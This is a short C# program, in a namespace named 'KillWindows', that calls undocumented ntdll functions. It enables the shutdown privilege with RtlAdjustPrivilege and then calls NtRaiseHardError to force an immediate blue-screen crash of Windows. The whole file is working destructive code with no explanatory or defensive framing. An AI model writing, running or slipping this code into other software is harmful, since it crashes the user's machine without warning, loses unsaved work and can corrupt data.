using System;
using System.Runtime.InteropServices;

namespace KillWindows
{
    class bsod
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        static void Main(string[] args)
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1); // Enable SeShutdownPrivilege
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2); // Shutdown
        }
    }
}
